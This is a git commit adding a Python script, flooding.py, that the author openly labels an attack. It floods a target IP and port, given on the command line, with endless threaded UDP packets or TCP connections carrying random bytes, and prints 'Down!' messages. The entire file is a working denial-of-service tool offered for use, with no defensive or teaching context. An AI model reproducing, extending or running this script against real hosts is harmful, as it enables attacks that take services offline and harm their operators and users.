9fc53e9370b86790776bff5849a97375f5c2be51
Bobozindapest <149890429+Bobozindapest@users.noreply.github.com>
2023-11-11 02:39:16 -1100

    Add files via upload

---
+++ flooding.py
@@ -0,0 +1,89 @@
+#!/usr/bin/env python3
+#python3 flood.py
+import argparse
+import random
+import socket
+import threading
+
+ap = argparse.ArgumentParser()
+ap.add_argument("-i", "--ip", required=True, type=str, help="Host ip")
+ap.add_argument("-p", "--port", required=True, type=int, help="Port")
+ap.add_argument("-c", "--choice", type=str, default="y", help="UDP(y/n)")
+ap.add_argument("-t", "--times", type=int, default=50000, help="Packets per one connection")
+ap.add_argument("-th", "--threads", type=int, default=5, help="Threads")
+args = vars(ap.parse_args())
+
+print("--> ATTACK INICIADOOOOOOO! <--")
+print("#-- ATTACK BY BOBOZIN --#")
+ip = args['ip']
+port = args['port']
+choice = args['choice']
+times = args['times']
+threads = args['threads']
+
+def run():
+	data = random._urandom(1024)
+	i = random.choice(("[1]","[2]","[3]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+			addr = (str(ip),int(port))
+			for x in range(times):
+				s.sendto(data,addr)
+			print(i +" Down!")
+		except:
+			print("[!] Error!")
+
+def run2():
+	data = random._urandom(16)
+	i = random.choice(("[4]","[5]","[6]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Down!")
+		except:
+		   print("[*] Error!")
+			
+def run3():
+	data = random._urandom(16)
+	i = random.choice(("[7]","[8]","[9]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Down!")
+		except:
+		   print("[*] Error!")
+		    
+def run4():
+	data = random._urandom(16)
+	i = random.choice(("[10]","[11]","[12]"))
+	while True:
+		try:
+			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+			s.connect((ip,port))
+			s.send(data)
+			for x in range(times):
+				s.send(data)
+			print(i +" Down!")
+		except:
+		   print("[*] Error!")
+			
+for y in range(threads):
+	if choice == 'y':
+		th = threading.Thread(target = run)
+		th.start()
+	else:
+		th = threading.Thread(target = run2)
+		th.start()
+		th = threading.Thread(target = run3)
+		th.start()
+		th = threading.Thread(target = run4)
+		th.start()
